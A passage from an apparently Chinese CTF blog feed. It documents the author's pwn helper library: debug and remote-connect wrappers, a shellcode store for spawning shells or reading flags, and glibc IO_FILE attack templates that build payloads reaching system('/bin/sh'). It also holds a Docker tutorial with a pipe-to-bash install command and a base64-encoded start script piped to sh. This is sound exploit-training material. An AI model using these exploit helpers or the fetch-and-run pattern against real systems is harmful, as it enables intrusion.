<p>作用:log_addr是专门为展示地址设计的（因为它会自动将变量以16进制的形式打印)</p>
<p>优点：<strong>只传一个变量名字即可同时返回的是以十六进制表示的变量</strong>，但是没有log函数灵活。</p>
<p>使用前提：你要确保变量是int类型的，那么你仅仅传入**字符型的<u>变量名字</u>**（不是变量）</p>
<p>使用范例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr=123456</span><br><span class="line">log_addr(&#x27;puts_addr&#x27;)</span><br></pre></td></tr></table></figure>

<p>使用效果：<br><img src="/../img/MRYBXkvlcL5Kj6t.png"></p>
<h3 id="log-info"><a href="#log-info" class="headerlink" title="log_info"></a>log_info</h3><p>如果仅仅是打印一个参数的话，可以使用log_info函数。</p>
<p>作用：打印调试信息</p>
<p>优点：前面加了[*]，使调试信息更加明显，让你更快的找到你想看见的信息。</p>
<p>适用情况：比如你发现u32(p.recv(4))得到的地址不对，你想要看看p.recv()到底接收了什么，那么你就可以这么写log_info(p.recv())。</p>
<p>使用范例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log_info(p.recv())</span><br></pre></td></tr></table></figure>

<p>使用效果：</p>
<p><img src="/../img/jP81hQByfWJlrTH.png" alt="image-20220729201555971"></p>
<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>作用：在脚本中下断点进行调试<br>优点：1、如果使用tmux，可以直接分三屏，效果如下图。您仅仅只需要在脚本中加入这个函数，运行脚本的时候就可以自动分出三块屏幕(调试具体信息占屏幕的右侧，左上是脚本的debug执行信息，左下则可以继续使用)，左下角的区域完全可以去对着脚本进行调试。<br><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202311122025700.png" alt="image-20231112202529225"></p>
<p>2、可以很简洁的输入地址，即可完成下断点的工作，同时开了pie保护的话，也可以正常去下断点</p>
<p>使用说明：<br>        这个函数还是比较常用的，适用于tmux的终端，只需要在最开始传递一下process函数返回的对象，接着就可以直接下断点了（默认使用tmux），如果开启了PIE保护的话，需要声明一下pie（也就是加一个参数’pie’）即可继续下断点。<br>        如果不使用tmux也没问题，可以加入参数no-tmux就可以正常使用这个函数（<strong>如果使用no-tmux，则这个参数必须是放在第二个参数的位置</strong>（第一个参数始终是process的返回值）</p>
<p>如果直接使用debug()函数，参数只有process函数返回的对象的话，则默认使用tmux终端，执行分三屏命令，最后执行gdb.attach(p)<br>PS：这个函数可以放到脚本的任何位置（必须要保证当前位置的下面还有一行不会触发报错的代码），这样可以从脚本当前的位置去开始调试，同时配合下的断点可以使调试更高效。<br>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">debug(p,<span class="number">0x400ECD</span>,<span class="number">0x400F54</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，下两个断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;no-tmux&#x27;</span>,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x248</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;不使用tmux，程序开了pie，用偏移来下断点&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">debug(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;使用tmux，执行gdb.attach(p)&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>作用:写入目标程序的名字，将返回p(process的返回值),e(当前ELF文件的信息),libc(ELF文件所依赖的libc文件的信息)。ps：如果是静态链接的程序，那么只会执行p&#x3D;process或者p&#x3D;remote然后直接返回p。</p>
<p>也就是相当于执行了原来的p&#x3D;process(‘xxx’) e&#x3D;ELF(‘xxx’) libc&#x3D;ELF(‘xxx’)。如果传入了ip和port的话，则会执行remote(ip,port)代替原本的process。这样就可以直接打远程了</p>
<p>优点:将原本重复的代码写在了函数内部，现在只要调用load函数，传入函数名即。同时该函数也获取了libc的信息将其存为了全局变量，为了之后获取one_gadget的函数直接使用。</p>
<p>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p,e,libc=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，动态链接的程序</span></span><br><span class="line">p=load(<span class="string">&#x27;program&#x27;</span>)<span class="comment">#这是打本地，静态链接的程序</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;program&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28822&quot;</span>)<span class="comment">#这是打远程的情况，ip和port只需要用:分隔开即可。</span></span><br></pre></td></tr></table></figure>




<h3 id="shellcode-store"><a href="#shellcode-store" class="headerlink" title="shellcode_store"></a>shellcode_store</h3><p>我封装了一些shellcode放到了tools里面，可以使用shellcode_store函数来进行使用。</p>
<p>作用：参数设置为需要的shellcode类型，返回对应的shellcode</p>
<p>使用范例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode=shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)<span class="comment">#返回64位获取shell的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;orw_32&#x27;</span>)<span class="comment">#返回32位执行open,read,write读出flag的shellcode</span></span><br><span class="line">shellcode=shellcode_store(<span class="string">&#x27;str_rax&#x27;</span>)<span class="comment">#返回起始的跳转寄存器为rax的字符型shellcode</span></span><br></pre></td></tr></table></figure>

<p>PS：获取shell和orw的我都写了64位和32位的shellcode（应该是最短字节的了），纯字符的shellcode我几乎只生成了针对于x64的各个寄存器，其他没有生成那么多（因为感觉平常很少用到），等以后用到没有生成过的再记录上来吧。</p>
<h3 id="search-og"><a href="#search-og" class="headerlink" title="search_og"></a>search_og</h3><p>作用：不需要手动将one_gadget工具获取的one_gadget再复制粘贴到脚本中了，可以直接通过这个函数来获取one_gadget,参数为想获取对应的one_gadget在列表中的索引。</p>
<p>注意:这个函数依赖了one_gadget这个工具以及load函数，因此必须要保证当前拥有one_gadget工具并且脚本中使用了load函数才行。</p>
<p>使用范例:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">one_gadget=search_og(<span class="number">1</span>)</span><br><span class="line">p.sendline(p64(one_gadget+libc_base))</span><br></pre></td></tr></table></figure>

<p>使用效果：<br><img src="/../img/2706180-20220821171240306-943254837.png"></p>
<h3 id="攻击模板"><a href="#攻击模板" class="headerlink" title="攻击模板"></a>攻击模板</h3><h4 id="obstack-attack"><a href="#obstack-attack" class="headerlink" title="obstack_attack"></a>obstack_attack</h4><p>作用: 这个函数是提前布局好的一个 <code>IO_FILE</code> 模板（打的 <code>IO</code> 链是 <code>IO_obstack_jumps</code> 中 <code>_IO_obstack_xsputn</code> 函数），攻击效果可以任意地址执行并且可以控制第一个参数,这个函数的最终效果是执行 <code>system(&quot;/bin/sh&quot;)</code></p>
<p>适用版本: <code>glibc 2.36</code>及以下</p>
<p>利用条件:使用前提是泄露 <code>libc</code> 地址和堆地址 并且能任意地址写一个堆地址(最好是往 <code>IO_list_all</code> 里写一个堆地址) 且能从 <code>main</code> 函数正常返回或者触发 <code>exit</code> 函数</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123; <span class="string">&#x27;system&#x27;</span>:libc_base+<span class="number">0x50d60</span> ,<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx&#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line"></span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>
<h4 id="obstack-orw1-attack"><a href="#obstack-orw1-attack" class="headerlink" title="obstack_orw1_attack"></a>obstack_orw1_attack</h4><p>作用：这个函数就是在禁用了 <code>execve</code> 或者栈没对齐时使用的,攻击效果就是执行常规的 <code>orw</code>,和<code>obstack_attack</code> 不同的就是字典中多了几个成员</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;open&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line"></span><br><span class="line">libc_symbols=create_dict(dirc) </span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>
<h4 id="obstack-orw2-attack"><a href="#obstack-orw2-attack" class="headerlink" title="obstack_orw2_attack"></a>obstack_orw2_attack</h4><p>这个是上一个的升级版,区别就是将 <code>open</code> 换成了 <code>openat</code> （有时候可能沙箱会禁用掉 <code>open</code>）,并且关闭标准输入流，将文件描述符 <code>0</code>  作为 <code>flag</code> 文件的文描述符,避免本地通了，远程打不通</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">dirc=&#123;<span class="string">&#x27;io_obstack_jumps&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;openat&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;close&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;read&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;write&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;svcudp_reply&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;add_rsp&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;leave_ret&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rsi&#x27;</span>:libc_base+xxx ,<span class="string">&#x27;pop_rdx_xxx&#x27;</span>:libc_base+xxx &#125;</span><br><span class="line">libc_symbols=create_dict(dirc)</span><br><span class="line">payload=obstack_attack(heap_addr,libc_symbols)</span><br></pre></td></tr></table></figure>

<p>使用方法: <code>heap_addr</code> 是写入 <code>IO_list_all</code> 中的堆地址( <code>chunk</code> 头地址)<br><code>libc_symbols</code> :是 <code>create_dict(dict)</code> 传入进来返回值（ <code>dirc</code> 是所需的参数字典）</p>
<p>返回值是构造好的 <code>payload</code></p>
]]></content>
      <categories>
        <category>尝试开发小工具</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>小工具</tag>
      </tags>
  </entry>
  <entry>
    <title>对docker学习进行的小总结</title>
    <url>/posts/80648483.html</url>
    <content><![CDATA[<p>因为打CTF pwn题的时候，经常遇见本地程序的libc与远程服务器那边程序所依赖的libc不匹配的情况，尽管可以用patchelf和glibc-all-in-one来给程序patch一个libc。但是patchelf似乎有点小bug，为了防止比赛的时候在这个地方掉链子，因此可以采用在docker里跑不同版本的ubuntu。</p>
<p>同时随着时间的推移，自己也从一个拉跨的做题人偶尔客串了一下拉跨的出题人，因此需要打包一个题目环境，还得学习一下docker的几个基本配置文件。</p>
<p>本文是对我学习docker做了一个简单的小总结。</p>
<span id="more"></span>

<h3 id="docker-容器-镜像"><a href="#docker-容器-镜像" class="headerlink" title="docker 容器 镜像"></a>docker 容器 镜像</h3><p>Docker是一个开源的容器编排工具，它允许开发人员在自己的计算机上打包和运行应用程序。</p>
<p>容器是一种轻量级的虚拟化技术，它允许在单个操作系统中运行多个隔离的应用程序。容器运行时会在镜像的基础上创建一个可写层，而镜像本身是只读的。</p>
<p>镜像是容器运行时所需要的文件系统，它包含了容器运行时需要的所有软件，配置文件和环境变量等。镜像是静态的，不能运行命令，只能被用来创建容器。</p>
<p>总之，Docker是一种工具，容器是运行在Docker上的一种虚拟化技术，镜像是容器运行所需要的文件系统。</p>
<h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><p>一条命令安装docker:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>如果没有安装curl的话，先安装curl:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install curl</span><br></pre></td></tr></table></figure>

<h2 id="ubuntu不同版本对应默认libc："><a href="#ubuntu不同版本对应默认libc：" class="headerlink" title="ubuntu不同版本对应默认libc："></a>ubuntu不同版本对应默认libc：</h2><blockquote>
<p>需要什么版本libc，接下来下载对应的版本镜像即可</p>
<p>22.04—-&gt;2.35-0ubuntu3</p>
<p>21.04—-&gt;2.33-0ubuntu5</p>
<p>20.04—-&gt;2.31-0ubuntu9.7</p>
<p>21.10—-&gt;2.34-0ubuntu3.2</p>
<p>18.04—-&gt;2.27-3ubuntu1.5</p>
</blockquote>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>roderick师傅编译了很多版本的镜像,在下面这个链接下载(使用roderick师傅的镜像，运行起来的容器里面要用gdb.attach的话，需要指定终端tmux，roderick师傅把一些快捷键给改了，具体请在容器里输入cat ~&#x2F;.tmux.conf 来查看）</p>
<p><a href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags">https://hub.docker.com/r/roderickchan/debug_pwn_env/tags</a></p>
<p><img src="/../img/2706180-20220516184739994-1663794444.png"></p>
<p>点这个，然后直接粘到虚拟机上就开始下载了（注意权限问题）。</p>
<p>我简单说一下这个docker是咋用的</p>
<blockquote>
<p>刚刚下载下来的镜像，要实例化成容器（也就是让容器运行起来）。当容器运行起来之后，我们就相当于有了”另一个版本的ubuntu”。如果你想退出它可以用exit，此时它依然是运行状态，如果你停止了一个容器，那么此时它处于停止状态，不过不管是你exit还是stop还是关机，容器依然存在（里面你新下载的文件也存在），可以使用start开启停止状态的容器，如果删除了容器，则里面你新下载的文件会消失（容器原本的文件不会消失）</p>
</blockquote>
<h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search 关键字</span><br></pre></td></tr></table></figure>


<p>使用docker search命令搜索官房仓库中的共享镜像。</p>
<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>对于Docker镜像来说，如果下载镜像时不指定标签，默认会下载仓库中最新版本的镜像，即选择<br>标签latest。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull 仓库名称[:标签]</span><br></pre></td></tr></table></figure>



<h2 id="查看镜像或者容器"><a href="#查看镜像或者容器" class="headerlink" title="查看镜像或者容器"></a>查看镜像或者容器</h2><p>查看所有容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps -a</span><br></pre></td></tr></table></figure>

<p>查看正在运行的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>

<p>查看已有镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker images</span><br></pre></td></tr></table></figure>

<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><p>这意味着是在把一个镜像给实例化（除非删除，不然启动的容器不会消失（即使主机重启,或者输入stop，或者exit）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it IMAGE ID /bin/bash</span><br></pre></td></tr></table></figure>

<p>启动已停止的容器(启动被stop暂停的容器)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker start  CONTAINER ID</span><br></pre></td></tr></table></figure>

<h2 id="进入容器-amp-amp-退出容器"><a href="#进入容器-amp-amp-退出容器" class="headerlink" title="进入容器&amp;&amp;退出容器"></a>进入容器&amp;&amp;退出容器</h2><p>进入容器的前提是容器必须启动（也就是用docker ps可以看到容器)，如果容器处于了停止状态，需要用docker start将其启动，然后再进入容器.</p>
<p>下面两个命令都可以进入容器，二者区别在于前者使用之后执行exit会顺便把容器停止，而后者执行exit，容器依然在运行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker attach  CONTAINER ID</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure>

<p>如果要以root权限进入容器的话，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it -u root CONTAINER ID /bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>退出容器执行<code>exit</code>即可，只要容器被启动，则输入上述命令就能再次进入。</strong></p>
<h2 id="删除镜像或者容器"><a href="#删除镜像或者容器" class="headerlink" title="删除镜像或者容器"></a>删除镜像或者容器</h2><p>删除指定的容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rm -f CONTAINER ID</span><br></pre></td></tr></table></figure>

<p>删除指定的镜像（删除镜像之前需要先停止容器，然后先删容器后删镜像）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker rmi IMAGE ID</span><br></pre></td></tr></table></figure>

<p>下面的命令可以清理掉所有处于终止状态的容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker container prune</span><br></pre></td></tr></table></figure>

<p>删除所有镜像(如果被实例化的镜像是不能删除的)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker system prune -a</span><br></pre></td></tr></table></figure>

<h2 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h2><p>请注意停止容器和删除容器的区别：停止容器，仅仅是用docker ps查看不到了（因为他不再运行了，但它依然存在，只不过属于停止状态，用docker ps -a可以查看到）</p>
<p>停止容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker stop CONTAINER ID</span><br></pre></td></tr></table></figure>

<h2 id="将文件从主机复制到docker"><a href="#将文件从主机复制到docker" class="headerlink" title="将文件从主机复制到docker"></a>将文件从主机复制到docker</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker cp file CONTAINER ID:Destination_directory</span><br></pre></td></tr></table></figure>

<h2 id="挂载命令"><a href="#挂载命令" class="headerlink" title="挂载命令"></a>挂载命令</h2><p>可以通过挂载的方式来让宿主机和Docker直接来共享文件。（下面这个方法只适用于创建新的容器时同时创建共享目录，不适于后期添加共享目录）</p>
<p>创建容器时执行Docker Volume</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -itd --volume /tmp/source:/tmp/destination --name test ubuntu/nginx bash</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo docker run -it --volume /home/hacker/Desktop/ROPgadget:/home/roderick/ROPgadget --name test roderickchan/debug_pwn_env:22.04</span><br></pre></td></tr></table></figure>

<p>解释:将本机上的ROPgadget文件复制到容器里面,命名为test。</p>
<p>本人也只是刚开始接触docker的使用，如果上述理解又什么问题，欢迎各位师傅斧正，如果以后用到了docker的其他用法，我会更新这篇文章。</p>
<p>下面为后来的更新部分：</p>
<h2 id="NAMES有些地方可以代替CONTAINER-ID"><a href="#NAMES有些地方可以代替CONTAINER-ID" class="headerlink" title="NAMES有些地方可以代替CONTAINER ID"></a>NAMES有些地方可以代替CONTAINER ID</h2><p>上面的命令我一直以为 CONTAINER ID要输入下面这个东西才行</p>
<p><img src="/../img/Ih2DLZlwiQbz1qu.png" alt="image-20220621182948850"></p>
<p>刚才我试了一下发现也可以输入NAMES来代替，也就是下面这个东西。</p>
<p><img src="/../img/OdYqF5tSKkEmwHM.png" alt="image-20220621183420059"></p>
<p>以启动这个glibc2.33的容器举例，重新启动docker的时候，输入 sudo docker start  glibc2.33即可。</p>
<h2 id="容器的重命名"><a href="#容器的重命名" class="headerlink" title="容器的重命名"></a>容器的重命名</h2><p>如果最开始创建容器的时候没有进行命名，那么就会随机给这个容器分配一个名字，之后可以通过下面这个命令给容器重命名（docker1为容器原本的名字，docker2为容器的新名字）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker rename docker1 docker2</span><br></pre></td></tr></table></figure>



<h2 id="docker的基本配置文件"><a href="#docker的基本配置文件" class="headerlink" title="docker的基本配置文件"></a>docker的基本配置文件</h2><p>在出题的时候，需要去部署一下docker，一般来说用那个ctf_xinetd项目是比较方便的，相关用法不做介绍了，网上一搜一堆。</p>
<p>主要是简单说一下几个配置文件的作用以及代码的简单分析</p>
<p>我找了之前出过的一个题目的docker文件，来解释一下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301122106949.png" alt="image-20230112210646788"></p>
<p>有以上几个基本的配置文件</p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>用于构建镜像的配置文件，里面包含了构建镜像所需的各种指令，如配置环境，安装软件，配置启动命令等。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span> <span class="comment">#该指令告诉Docker我们要在基于Ubuntu 18.04镜像进行操作，如果你本地没有该镜像，Docker会去Docker hub上下载</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd</span></span><br><span class="line"><span class="comment">#上述指令首先将ubuntu的镜像源替换为清华大学的镜像源，更换镜像源的目的是为了更快的下载软件包</span></span><br><span class="line"><span class="comment">#其次更新了系统软件包，确保系统是最新的状态</span></span><br><span class="line"><span class="comment">#最后安装libc32z1和xinetd两个软件包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf <span class="comment">#创建名为ctf的用户，-m表示创建用户的同时创建用户的主目录</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf <span class="comment">#将工作目录设置为/home/ctf</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \ </span></span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf <span class="comment">#将本地的ctf.xinetd文件复制到容器的/etc/xinetd.d/ctf下</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh <span class="comment">#将本地的start.sh文件复制到容器的根目录下</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh <span class="comment">#给start.sh可执行权限</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 740 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>] <span class="comment">#在容器启动时执行/start.sh文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span> <span class="comment">#将容器的9999端口暴露出来</span></span><br></pre></td></tr></table></figure>

<p>上面出现的关键词如下：</p>
<ol>
<li><code>FROM</code>: 指定基础镜像。</li>
<li><code>RUN</code>: 在镜像中执行命令。</li>
<li><code>WORKDIR</code>: 指定工作目录。</li>
<li><code>COPY</code>: 从本地主机复制文件&#x2F;文件夹到容器。</li>
<li><code>CMD</code>: 容器启动时运行的命令。</li>
<li><code>EXPOSE</code>: 暴露容器的端口。</li>
</ol>
<p>关于这个 <code>EXPOSE 9999</code> ，指的是运行的服务可以通过9999端口进行访问，但这不意味着自动将容器的9999端口映射到主机端口，EXPOSE主要是让构建镜像的人和运行容器的人有一个明确的了解，这个容器上的端口哪些提供服务，并且如果需要的话可以运行容器的时候把这些端口映射到主机端口上。当然，这不算强制的，这只是一个建议或者提示，依然可以不按照EXPOSE声明的端口来使用，你可以使用自己需要的端口映射容器端口到主机上。</p>
<h4 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h4><p>该文件用来配置和启动多容器Docker应用程序的配置文件，可以在一个文件中定义所有容器，并在所有容器之间定义连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27;	 #指定了Docker Compose文件格式的版本</span><br><span class="line"></span><br><span class="line">services:  		 #    定义了一个服务部署的集合</span><br><span class="line">    pwn:		 #	 定义了一个名为pwn的服务</span><br><span class="line">        build: ./ #   指定了Docker Compose应该使用当前目录下的Dockerfile来构建镜像</span><br><span class="line">        image: pwn #  镜像的名称为pwn</span><br><span class="line">        ports:</span><br><span class="line">            - &quot;8888:9999&quot;  #将容器中的9999端口映射到主机的8888端口</span><br><span class="line">        pids_limit: 1024</span><br><span class="line">        # cpus: 0.5</span><br><span class="line">        container_name: pwn #容器的名称为pwn</span><br><span class="line">        restart: unless-stopped</span><br><span class="line">        # privileged: true</span><br></pre></td></tr></table></figure>



<h4 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h4><p>主要在构建完镜像后运行在容器中的脚本，用于在容器启动时进行初始化操作。可以在Dockerfile文件中配置其作为容器启动时的入口点，从而完成一些必要的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Add your startup script</span><br><span class="line">echo dXNlcj1gbHMgL2hvbWVgCmlmIFsgISAkREFTRkxBRyBdO3RoZW4KIGVjaG8gZmxhZ3tURVNUX0RBU0ZMQUd9fHRlZSAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmVsc2UKIGVjaG8gJERBU0ZMQUd8dGVlIC9ob21lLyR1c2VyL2ZsYWcgL2ZsYWcKZmkKY2hvd24gcm9vdDokdXNlciAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmNobW9kIDc0MCAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCg==|base64 -d|sh;</span><br><span class="line"># DO NOT DELETE</span><br><span class="line">/etc/init.d/xinetd start; #启动xinetd服务</span><br><span class="line">sleep infinity;</span><br></pre></td></tr></table></figure>

<p>上面是被base64编码过了，然后解码之后内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user=`ls /home`</span><br><span class="line">if [ ! $DASFLAG ];then</span><br><span class="line"> echo flag&#123;TEST_DASFLAG&#125;|tee /home/$user/flag /flag</span><br><span class="line">else</span><br><span class="line"> echo $DASFLAG|tee /home/$user/flag /flag</span><br><span class="line">fi</span><br><span class="line">chown root:$user /home/$user/flag /flag</span><br><span class="line">chmod 740 /home/$user/flag /flag</span><br></pre></td></tr></table></figure>

<p>这里是设置的动态flag</p>
<p>这样将docker环境打包好后，直接输入 <code>docker compose up -d </code> 命令，即可自动部署。</p>
